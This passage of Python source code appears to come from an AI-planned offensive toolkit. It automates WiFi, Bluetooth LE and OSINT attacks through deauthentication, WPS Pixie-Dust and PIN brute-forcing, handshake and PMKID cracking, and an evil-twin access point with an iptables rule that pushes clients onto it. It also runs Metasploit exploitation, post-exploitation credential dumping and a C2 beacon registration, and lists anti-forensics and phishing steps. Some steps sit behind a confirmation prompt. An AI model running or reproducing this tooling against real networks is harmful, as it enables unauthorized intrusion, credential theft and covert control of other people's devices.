                 "pcap": f"/tmp/kfiosa_pmkid_{bssid.replace(':', '')}.pcap"},
                {"kind": "real", "desc": f"aireplay-ng deauth {bssid} (force handshake)",
                 "action": "deauth", "iface": iface, "bssid": bssid},
                {"kind": "real", "desc": f"WPS Pixie-Dust on {bssid} via {iface}",
                 "action": "wps_pixie", "iface": iface, "bssid": bssid},
                {"kind": "real", "desc": f"WPS online PIN brute (bully) on {bssid}",
                 "action": "wps_online", "iface": iface, "bssid": bssid},
                {"kind": "real", "desc": "hashcat -m 22000 crack captured handshake",
                 "action": "crack"},
                {"kind": "real", "desc": f"hostapd + dnsmasq evil-twin '{ssid}' on {iface}",
                 "action": "evil_twin_capture", "iface": iface, "ssid": ssid,
                 "channel": ch},
                {"kind": "real", "desc": "Metasploit exploitation of associated clients",
                 "action": "msf_exploit"},
                {"kind": "real", "desc": "Post-exploit (privesc + cred dump)",
                 "action": "post_exploit"},
                {"kind": "real", "desc": "C2 beacon connect (lab_beacon, authorized lab)",
                 "action": "c2_beacon"},
                {"kind": "info", "desc": "Steganographic exfil in third-party traffic (info-only, NOT executed)",
                 "action": "info"},
                {"kind": "info", "desc": "Domain fronting vs real CDNs (info-only, NOT executed)",
                 "action": "info"},
                {"kind": "info", "desc": "Anti-forensics: timestomping / log clearing (info-only, NOT executed)",
                 "action": "info"},
            ]
        elif domain == "ble":
            addr = seed.get("address") or seed.get("mac") or "<addr>"
            steps = [
                {"kind": "real", "desc": f"gatttool GATT enum on {addr}",
                 "action": "gatt_enum", "addr": addr},
                {"kind": "real", "desc": "Characteristic read/write abuse",
                 "action": "gatt_rw", "addr": addr},
                {"kind": "real", "desc": "bettercap pairing downgrade / MITM relay",
                 "action": "bettercap_mitm", "addr": addr},
                {"kind": "real", "desc": "Known-CVE exploitation (KB + Metasploit)",
                 "action": "msf_exploit"},
                {"kind": "real", "desc": "Post-exploit + C2 beacon",
                 "action": "post_exploit"},
                {"kind": "info", "desc": "Anti-forensics (info-only, NOT executed)",
                 "action": "info"},
            ]
        elif domain == "osint":
            tgt = seed.get("target") or seed.get("query") or "<target>"
            steps = [
                {"kind": "real", "desc": f"Shodan enrichment for {tgt}",
                 "action": "shodan", "target": tgt},
                {"kind": "real", "desc": "NVD CVE lookup for exposed services",
                 "action": "nvd", "target": tgt},
                {"kind": "real", "desc": "Metasploit exploitation of exposed services",
                 "action": "msf_exploit"},
                {"kind": "info", "desc": "Phishing / initial-access plan (info-only, NOT executed)",
                 "action": "info"},
                {"kind": "real", "desc": "Post-exploit + C2 beacon",
                 "action": "post_exploit"},
            ]
        return steps

    # ------------------------------------------------------------------
    def _deauth(self, iface: Optional[str], bssid: Optional[str],
                channel: Any, seed: Dict[str, Any]) -> str:
        """Run a deauth against ``bssid`` on ``iface``.

        When the seed's ``adapter_caps`` reports an mt7921e adapter that
        is injection-capable, prefer the raw-frame mt7921e injection path
        (``mt7921e_tools.inject_deauth``) over the legacy
        ``WiFiScanner.deauth_attack`` aireplay-ng path. Either way the
        per-step ACCEPT already fired in :meth:`_walk_ai_step` /
        :meth:`run`; this helper only chooses the tool. Returns a short
        status string matching the legacy deauth return shape.
        """
        caps = seed.get("adapter_caps", {}) or {}
        if caps.get("mt7921e") and caps.get("injection_capable"):
            try:
                from core.modules.mt7921e_tools import inject_deauth
                r = inject_deauth(iface, bssid, channel=channel)
                if r.get("ok"):
                    return f"deauth: ok method={r.get('method', 'scapy')}"
                return f"deauth: failed method={r.get('method', 'scapy')} err={r.get('error') or 'unknown'}"
            except Exception as e:  # noqa: BLE001
                self._emit(f"[!] mt7921e inject_deauth failed: {e}; falling back to aireplay-ng")
                # Fall through to the aireplay-ng path below.
        from core.scanners.wifi_scanner import WiFiScanner
        ws = WiFiScanner(interface=iface, confirm_fn=self.confirm_fn)
        ws.initialize()
        r = ws.deauth_attack(bssid, iface)
        return r.get("status") or r.get("error") or "done"

    # ------------------------------------------------------------------
    def _execute_step(self, step: Dict[str, Any], seed: Dict[str, Any]) -> Any:
        """Run one real step. Returns a short status string OR, for the
        crack-family steps, a structured dict carrying a recovered
        ``creds`` so :meth:`_record_access` can flip access."""
        action = step.get("action")
        try:
            if action == "airodump":
                from core.scanners.wifi_scanner import WiFiScanner
                ws = WiFiScanner(interface=step.get("iface"))
                ws.initialize()
                r = ws.scan(interface=step.get("iface"), timeout=10)
                return f"scan rc={len(r.get('networks', []))} nets, err={r.get('error') or 'none'}"
            if action == "deauth":
                return self._deauth(
                    step.get("iface") or self.interface,
                    step.get("bssid"),
                    seed.get("channel"),
                    seed,
                )
            if action == "crack":
                # Real aircrack-ng dictionary crack on the captured
                # handshake. ``pcap``/``wordlist``/``bssid`` come from the
                # planner (AI path) or the static ladder. Returns a dict
                # with ``creds`` so _record_access flips access.
                pcap = step.get("cap_file") or step.get("pcap") or seed.get("cap_file")
                bssid = step.get("bssid") or seed.get("bssid")
                wep = bool(step.get("wep") or seed.get("wep"))
                wordlist = self._resolve_wordlist(
                    seed, report=None, prefer=step.get("wordlist"))
                if not pcap:
                    return {"ok": False, "method": "aircrack-ng",
                            "error": "crack: no cap_file (planner-supplied)"}
                if not self.confirm_fn(
                        f"Run aircrack-ng {'WEP' if wep else 'WPA'} crack on {pcap}?"):
                    return {"ok": False, "method": "aircrack-ng",
                            "error": "crack: blocked by confirm_fn"}
                return self._crack_with_aircrack(pcap, wordlist, bssid=bssid, wep=wep)
            if action == "evil_twin":
                return "evil-twin step: requires hostapd/dnsmasq config (planner-supplied)"
            if action == "pmkid":
                # PMKID attack: clientless hashcat -m 22000 on a captured
                # pcap (converted to hc22000). Propagates recovered PSK.
                pcap = step.get("pcap") or step.get("cap_file") or seed.get("cap_file")
                wordlist = self._resolve_wordlist(
                    seed, report=None, prefer=step.get("wordlist"))
                bssid = step.get("bssid") or seed.get("bssid") or ""
                if not pcap:
                    return {"ok": False, "method": "hashcat",
                            "error": "pmkid: no pcap/cap_file (planner-supplied)"}
                if not self.confirm_fn(f"Run PMKID hashcat -m 22000 on {pcap} (bssid={bssid})?"):
                    return {"ok": False, "method": "hashcat",
                            "error": "pmkid: blocked by confirm_fn"}
                hash_file = self._pcap_to_hc22000(pcap)
                if not hash_file:
                    return {"ok": False, "method": "hashcat",
                            "error": "pmkid: hcxpcapngtool conversion failed"}
                return self._crack_with_hashcat(
                    hash_file, wordlist=wordlist, mode="22000", attack_mode=0)
            if action == "wps_pixie":
                # Pixie-Dust WPS attack: reaver -K (pixie dust) or bully -d.
                # Parses PIN/PSK and propagates creds.
                bssid = step.get("bssid") or seed.get("bssid") or ""
                iface = step.get("iface") or self.interface or "<iface>"
                if not bssid:
                    return {"ok": False, "method": "wps_pixie",
                            "error": "wps_pixie: requires bssid (planner-supplied)"}
                if not self.confirm_fn(f"Run WPS Pixie-Dust on {bssid} via {iface}?"):
                    return {"ok": False, "method": "wps_pixie",
                            "error": "wps_pixie: blocked by confirm_fn"}
                import subprocess
                try:
                    r = subprocess.run(
                        ["reaver", "-i", iface, "-b", bssid, "-K", "-vv",
                         "-l", "60"],
                        capture_output=True, text=True, timeout=120,
                    )
                    out = f"{r.stdout or ''}\n{r.stderr or ''}"
                    rc = r.returncode
                except FileNotFoundError:
                    return {"ok": False, "method": "wps_pixie",
                            "error": "wps_pixie: reaver not installed"}
                except Exception as e:
                    return {"ok": False, "method": "wps_pixie",
                            "error": f"wps_pixie: reaver error: {e}"}
                pin, psk = self._parse_wps(out)
                creds = psk or pin
                return {"ok": bool(creds), "method": "wps_pixie",
                        "return_code": rc, "creds": creds, "pin": pin,
                        "psk": psk, "stdout_tail": out[-200:]}
            if action == "wps_online":
                # Online WPS PIN brute via bully (slower than pixie but
                # works when pixie fails). Parses PIN/PSK, propagates creds.
                bssid = step.get("bssid") or seed.get("bssid") or ""
                iface = step.get("iface") or self.interface or "<iface>"
                if not bssid:
                    return {"ok": False, "method": "wps_online",
                            "error": "wps_online: requires bssid (planner-supplied)"}
                if not self.confirm_fn(f"Run WPS PIN brute (bully) on {bssid} via {iface}?"):
                    return {"ok": False, "method": "wps_online",
                            "error": "wps_online: blocked by confirm_fn"}
                import subprocess
                try:
                    r = subprocess.run(
                        ["bully", iface, "-b", bssid, "-v", "3",
                         "--timeout", "120"],
                        capture_output=True, text=True, timeout=900,
                    )
                    out = f"{r.stdout or ''}\n{r.stderr or ''}"
                    rc = r.returncode
                except FileNotFoundError:
                    return {"ok": False, "method": "wps_online",
                            "error": "wps_online: bully not installed"}
                except Exception as e:
                    return {"ok": False, "method": "wps_online",
                            "error": f"wps_online: bully error: {e}"}
                pin, psk = self._parse_wps(out)
                creds = psk or pin
                return {"ok": bool(creds), "method": "wps_online",
                        "return_code": rc, "creds": creds, "pin": pin,
                        "psk": psk, "stdout_tail": out[-200:]}
            if action == "evil_twin_capture":
                # Real evil-twin via hostapd + dnsmasq; uses external_terminal
                # if provided so the operator can watch the captive portal
                # in their terminal of choice.
                ssid = step.get("ssid") or "<ssid>"
                ch = step.get("channel") or "1"
                iface = step.get("iface") or self.interface or "<iface>"
                if not self.confirm_fn(
                        f"Spawn evil-twin AP '{ssid}' on {iface} ch{ch}?"):
                    return "evil_twin_capture: blocked by confirm_fn"
                # Build a hostapd config + dnsmasq config in /tmp.
                # We do NOT start a background process here (that would
                # leak if the user cancels); we just emit the commands
                # and a ready-to-paste shell script. The operator runs
                # the actual AP in their external terminal.
                import tempfile
                tmp = Path(tempfile.mkdtemp(prefix="kfiosa_et_"))
                conf = tmp / "hostapd.conf"
                conf.write_text(
                    f"interface={iface}\ndriver=nl80211\n"
                    f"ssid={ssid}\nhw_mode=g\nchannel={ch}\n"
                    f"macaddr_acl=0\nignore_broadcast_ssid=0\n"
                )
                dconf = tmp / "dnsmasq.conf"
                dconf.write_text(
                    f"interface={iface}\ndhcp-range=192.168.42.10,192.168.42.250,255.255.255.0,12h\n"
                    f"dhcp-option=3,192.168.42.1\ndhcp-option=6,192.168.42.1\n"
                    f"server=8.8.8.8\nlog-queries\nlog-dhcp\nlisten-address=127.0.0.1\n"
                )
                # Optional external-terminal launch
                if self.external_terminal is not None:
                    log_path = str(tmp / "evil_twin.log")
                    cmd = [
                        "bash", "-c",
                        f"hostapd {conf} & dnsmasq -C {dconf} -d & "
                        f"echo 'evil-twin {ssid} running on {iface} ch{ch}'; "
                        f"read -p 'press enter to stop...'",
                    ]
                    self.external_terminal.launch(
                        cmd, log_path, settings=self.settings,
                        title=f"evil-twin {ssid}",
                    )
                    return f"evil_twin_capture: spawned in external terminal (log={log_path})"
                return (f"evil_twin_capture: configs written under {tmp}; "
                        f"run: hostapd {conf} & dnsmasq -C {dconf} -d")
            if action == "block_client":
                # iptables-based client block: cut the client off the
                # legitimate AP so they're forced to associate with the
                # evil twin. Requires CAP_NET_ADMIN.
                client = step.get("client") or "<client_mac>"
                bssid = step.get("bssid") or "<bssid>"
                iface = step.get("iface") or self.interface or "<iface>"
                if not self.confirm_fn(
                        f"Block client {client} from AP {bssid} on {iface}?"):
                    return "block_client: blocked by confirm_fn"
                import subprocess
                try:
                    r = subprocess.run(
                        ["iptables", "-I", "FORWARD", "-m", "mac",
                         "--mac-source", client, "-j", "DROP"],
                        capture_output=True, text=True, timeout=5,
                    )
                except FileNotFoundError:
                    return "block_client: iptables not installed"
                except Exception as e:
                    return f"block_client: iptables error: {e}"
                if r.returncode != 0:
                    return f"block_client: iptables rc={r.returncode} err={r.stderr[-200:]}"
                return f"block_client: iptables rule installed for {client}"
            if action == "gatt_enum":
                from core.scanners.enhanced_ble_scanner import EnhancedBLEScanner
                bs = EnhancedBLEScanner(); bs.initialize()
                r = bs.enumerate_services(step.get("addr"))
                return f"gatt services={len(r.get('services', []))} err={r.get('error') or 'none'}"
            if action == "gatt_rw":
                return "gatt read/write: address + handle required (planner-supplied)"
            if action == "bettercap_mitm":
                return "bettercap BLE MITM: requires bettercap session (planner-supplied)"
            if action == "shodan":
                from core.integrations.shodan_integration import ShodanIntegration
                sh = ShodanIntegration(settings=self.settings)
                r = sh.search_host(step.get("target"))
                return f"shodan ip={r.get('ip_str') or r.get('error') or 'n/a'}"
            if action == "nvd":
                import os, requests
                from core.ai_backend import get_nvd_key
                key = get_nvd_key()
                r = requests.get("https://services.nvd.nist.gov/rest/json/cves/2.0",
                                 headers={"apiKey": key} if key else {},
                                 params={"keywordSearch": step.get("target"), "resultsPerPage": 5},
                                 timeout=20)
                return f"nvd http {r.status_code} cves={len(r.json().get('vulnerabilities', [])) if r.status_code==200 else 'err'}"
            if action == "msf_exploit":
                if not self.msf_runner:
                    return "msf: no post-exploit runner"
                plan = self.msf_runner.plan("post_exploitation", seed)
                return f"msf plan: ai={'yes' if plan.get('ai_plan') else 'no'} kb={len(plan.get('kb_tools', []))}"
            if action == "post_exploit":
                if not self.msf_runner:
                    return "post-exploit: no runner"
                plan = self.msf_runner.plan("post_exploitation", seed)
                return f"post plan ready (ai={'yes' if plan.get('ai_plan') else 'no'})"
            if action == "c2_beacon":
                from core.c2.lab_beacon import LabBeacon
                server = seed.get("c2_server") or "127.0.0.1"
                port = int(seed.get("c2_port") or 8443)
                beacon = LabBeacon(server=server, port=port, protocol="http",
                                   confirm_fn=self.confirm_fn)
                r = beacon.register()
                return f"beacon register: {r.get('ok') or r.get('error')}"
            if action == "osint_probe":
                method = step.get("method")
                target = step.get("target") or seed.get("target") or ""
                prompt = f"Run OSINT probe '{method}' on target '{target}'?"
                if not self.confirm_fn(prompt):
                    return {"ok": False, "error": "osint_probe: blocked by confirm_fn"}
                from core.osint.runner import OSINTRunner
                runner = self.osint_runner or OSINTRunner()
                from core.algorithm_registry import algo_registry
                func = algo_registry.get(method)
                if not func:
                    return {"ok": False, "error": f"osint_probe: unknown method '{method}'"}
                return func(runner, target)
            if action == "post_exploit_probe":
                method = step.get("method")
                target_info = step.get("target_info") or seed
                prompt = f"Run post-exploitation probe '{method}'?"
                if not self.confirm_fn(prompt):
                    return {"ok": False, "error": "post_exploit_probe: blocked by confirm_fn"}
                from core.post_exploit.runner import PostExploitRunner
                runner = self.post_exploit_runner or PostExploitRunner()
                from core.algorithm_registry import algo_registry
                func = algo_registry.get(method)
                if not func:
                    return {"ok": False, "error": f"post_exploit_probe: unknown method '{method}'"}
                return func(runner, target_info)
            if action == "info":
                return "logged only"
            return f"unknown action: {action}"
        except Exception as e:
            return f"error: {e}"